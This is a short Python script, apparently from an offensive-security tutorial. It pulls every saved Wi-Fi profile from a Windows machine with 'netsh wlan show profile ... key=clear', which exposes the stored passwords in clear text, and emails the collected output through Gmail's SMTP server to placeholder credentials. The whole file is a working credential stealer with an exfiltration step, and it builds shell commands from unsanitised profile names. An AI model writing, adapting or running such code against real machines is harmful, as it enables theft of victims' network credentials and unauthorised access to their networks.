#!/usr/bin/env python

import subprocess,smtplib #smtplib sends email
import re



def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587) #google gmail runs on port 587
    server.starttls() #start tls connection
    server.login(email,password)
    server.sendmail(email,email,message) #send mail to self
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)",networks)


result = ""
for network_names in network_names_list:
    command = "netsh wlan show profile "+ network_names +" key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result += current_result

send_mail("yourmail","emailapppassword",result)